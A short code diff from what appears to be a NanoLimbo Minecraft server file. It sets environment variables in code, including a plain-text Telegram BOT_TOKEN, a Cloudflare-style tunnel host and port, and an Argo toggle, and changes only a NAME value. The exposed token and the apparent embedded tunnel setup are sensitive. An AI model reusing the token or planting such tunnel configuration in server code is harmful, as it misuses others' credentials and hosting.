@@ -142,7 +142,7 @@ import ua.nanit.limbo.server.Log;
         envVars.put("BOT_TOKEN", "7116091495:AAHCohEInCOhCwp_kBrB6qAd2LiI1T8Sr6o");
         envVars.put("CFIP", "cdns.doon.eu.org");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "altare-");
+        envVars.put("NAME", "altare");
         envVars.put("DISABLE_ARGO", "false");
         
         for (String var : ALL_ENV_VARS) {
